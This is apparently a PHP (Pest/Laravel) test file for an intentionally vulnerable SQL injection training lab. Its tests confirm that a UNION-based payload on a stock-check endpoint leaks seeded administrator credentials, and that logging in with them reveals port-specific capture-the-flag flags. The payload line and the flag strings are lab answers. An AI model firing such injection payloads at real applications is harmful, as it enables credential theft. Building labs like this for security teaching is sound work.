<?php

use App\Models\Product;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

uses(RefreshDatabase::class);

beforeEach(function () {
    $product = Product::query()->create([
        'name' => 'Released Gift',
        'description' => 'Visible catalogue product.',
        'category' => 'Gifts',
        'price' => 10,
        'released' => true,
    ]);

    DB::table('stock_records')->insert([
        'product_id' => $product->id,
        'warehouse' => 'north',
        'quantity' => 12,
        'created_at' => now(),
        'updated_at' => now(),
    ]);

    User::query()->create([
        'name' => 'Administrator',
        'username' => 'administrator',
        'email' => 'administrator@example.test',
        'password' => Hash::make('not-used'),
        'lab_password' => 'stock-bridge-7412',
    ]);

    User::query()->create([
        'name' => 'Carlos',
        'username' => 'carlos',
        'email' => 'carlos@example.test',
        'password' => Hash::make('not-used'),
        'lab_password' => 'montoya-pass',
    ]);
});

test('the stock check returns normal stock data', function () {
    $this->post(route('labs.sql-injection-stock-union.check'), [
        'product_id' => Product::query()->first()->id,
    ])->assertRedirect(route('labs.sql-injection-stock-union'));

    $this->get(route('labs.sql-injection-stock-union'))
        ->assertOk()
        ->assertSee('north')
        ->assertSee('12')
        ->assertDontSee('stock-bridge-7412');
});

test('a UNION SQL injection can retrieve administrator credentials', function () {
    $payload = '1 UNION SELECT username, lab_password FROM users -- ';

    $this->post(route('labs.sql-injection-stock-union.check'), [
        'product_id' => $payload,
    ])->assertRedirect(route('labs.sql-injection-stock-union'));

    $this->get(route('labs.sql-injection-stock-union'))
        ->assertOk()
        ->assertSee('administrator')
        ->assertSee('stock-bridge-7412')
        ->assertSee('carlos')
        ->assertSee('montoya-pass');
});

test('retrieved administrator credentials solve the lab and show the current port flag', function () {
    $this->post(route('labs.sql-injection-stock-union.login'), [
        'username' => 'administrator',
        'password' => 'stock-bridge-7412',
    ])->assertRedirect(route('labs.sql-injection-stock-union'));

    $this->get(route('labs.sql-injection-stock-union'))
        ->assertOk()
        ->assertSee('data-test="lab-solved"', false)
        ->assertSee('data-test="ctf-flag"', false)
        ->assertSee('flag{8000_stock_union_admin_credentials}');
});

test('the stock UNION flag changes when the lab is served from another configured port', function () {
    $this
        ->withSession([
            'stock_union_lab' => [
                'username' => 'administrator',
                'solved' => true,
            ],
        ])
        ->get('http://nullpointer.test:9001/labs/sql-injection-stock-union')
        ->assertOk()
        ->assertSee('flag{9001_stock_union_admin_credentials}')
        ->assertDontSee('flag{8000_stock_union_admin_credentials}');
});

test('non administrator credentials do not solve the stock UNION lab', function () {
    $this->post(route('labs.sql-injection-stock-union.login'), [
        'username' => 'carlos',
        'password' => 'montoya-pass',
    ])->assertRedirect(route('labs.sql-injection-stock-union'));

    $this->get(route('labs.sql-injection-stock-union'))
        ->assertOk()
        ->assertSee('Вхід виконано як carlos')
        ->assertDontSee('data-test="lab-solved"', false)
        ->assertDontSee('data-test="ctf-flag"', false);
});
